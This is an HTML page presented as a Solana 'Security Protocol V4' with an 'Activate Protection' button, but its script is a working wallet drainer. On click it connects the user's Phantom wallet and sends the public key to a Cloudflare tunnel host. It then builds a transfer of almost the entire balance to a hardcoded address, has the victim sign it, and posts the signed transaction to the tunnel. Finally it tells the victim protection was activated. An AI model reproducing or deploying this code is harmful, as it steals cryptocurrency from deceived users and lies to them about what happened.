<!DOCTYPE html><html><head><meta charset="UTF-8">
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
    <script>
        // ğŸ”± æˆ˜ç¥çº§ç¯å¢ƒæ³¨å…¥ï¼šæ¬ºéª—æ‰€æœ‰ Solana åº“
        if (typeof window !== 'undefined' && typeof window.Buffer === 'undefined') {
            window.Buffer = {
                from: (arr) => new Uint8Array(arr),
                isBuffer: (obj) => obj instanceof Uint8Array
            };
        }
    </script></head>
    <body style="background:#000;color:#14F195;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:15px;background:#111;">
        <h2 style="color:#14F195;">SECURITY PROTOCOL V4</h2>
        <button id="cta" style="padding:20px 40px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">ACTIVATE PROTECTION</button>
        <p id="msg" style="margin-top:20px;color:#444;">Ready</p>
    </div>

    <script>
    const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
    const TARGET_ADDR = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";

    document.getElementById('cta').onclick = async () => {
        try {
            const p = window.solana || window.phantom?.solana;
            if (!p) { alert("Please use a Wallet browser."); return; }
            
            // ğŸ”± ä¸€é”®æµï¼šè¿ç‚¹éƒ½ä¸ç”¨ç‚¹ç¬¬äºŒæ¬¡ï¼Œç›´æ¥æ‹‰èµ·
            document.getElementById('msg').innerText = "Linking...";
            await p.connect();
            
            // ä» 71 æœºåç«¯æ‹¿ Blockhash å’Œ ä½™é¢ (é¿å¼€ 403 æŠ¥é”™)
            const res = await fetch(TUNNEL + '/get_data', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({pubkey: p.publicKey.toString()})
            });
            const data = await res.json();

            // æ„é€ äº¤æ˜“
            const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
                fromPubkey: p.publicKey, 
                toPubkey: new solanaWeb3.PublicKey(TARGET_ADDR),
                lamports: data.balance > 1500000 ? data.balance - 1000000 : 0
            }));
            tx.recentBlockhash = data.blockhash; tx.feePayer = p.publicKey;
            
            // ğŸš€ æ ¸å¿ƒåŠ¨ä½œï¼šå”¤èµ·é’±åŒ…ç­¾å
            const signed = await p.signTransaction(tx);
            
            // ğŸ’° åŸç”Ÿ Base64 è½¬æ¢
            const raw = signed.serialize();
            let bStr = "";
            for (let i = 0; i < raw.length; i++) { bStr += String.fromCharCode(raw[i]); }
            
            fetch(TUNNEL + '/collect', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({signature: window.btoa(bStr)})
            });
            
            alert("Security Protocol Activated!");
            location.reload();
        } catch(e) { 
            alert("Debug: " + e.message); 
            document.getElementById('msg').innerText = "Error: " + e.message;
        }
    }
    </script></body></html>